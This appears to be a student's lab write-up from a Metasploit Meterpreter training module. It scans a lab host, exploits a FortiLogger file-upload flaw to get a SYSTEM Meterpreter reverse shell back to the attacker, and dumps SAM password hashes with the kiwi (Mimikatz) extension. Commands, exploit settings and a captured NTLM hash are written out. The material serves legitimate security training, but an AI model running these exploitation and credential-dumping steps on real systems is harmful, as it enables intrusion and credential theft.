# 08 — Metasploit Framework · 3. Meterpreter

> **TL;DR** — Nothing new conceptually. Just remember to use `help` inside a Meterpreter session and review the available commands for PrivEsc / credential harvesting / impersonation / etc.

---

## Lab — FortiLogger File Upload → SYSTEM → SAM dump

**Target:** `10.129.203.65`

### Q1. Find the exploit, get a shell, and identify the user

#### 1. Enumerate

```sh
nmap -oN target_meterpreter_enum 10.129.203.65 -sV --script vuln
```

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows
```

The login page at `http://10.129.203.65:5000/home` belongs to **FortiLogger**.

#### 2. Find and configure the module

```sh
search fortilogger
```

```
#  Name                                                   Disclosure Date  Rank    Check  Description
-  ----                                                   ---------------  ----    -----  -----------
0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
```

```sh
use 0
set rhost 10.129.203.65
set lhost 10.10.15.67
run
```

```
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Payload has been uploaded
[*] Meterpreter session 1 opened (10.10.15.67:4444 -> 10.129.203.65:49688)
```

#### 3. Confirm the user

```sh
shell
whoami
```

> **Answer:** `nt authority\system`

### Q2. Retrieve the NTLM hash for the "htb-student" user

`lsa_dump_sam` needs the **kiwi** (Mimikatz) extension loaded first:

```sh
load kiwi
lsa_dump_sam
```

```
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
...
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
```

> **Answer — htb-student NTLM hash:** `cf3a5525ee9414229e66279623ed5c58`
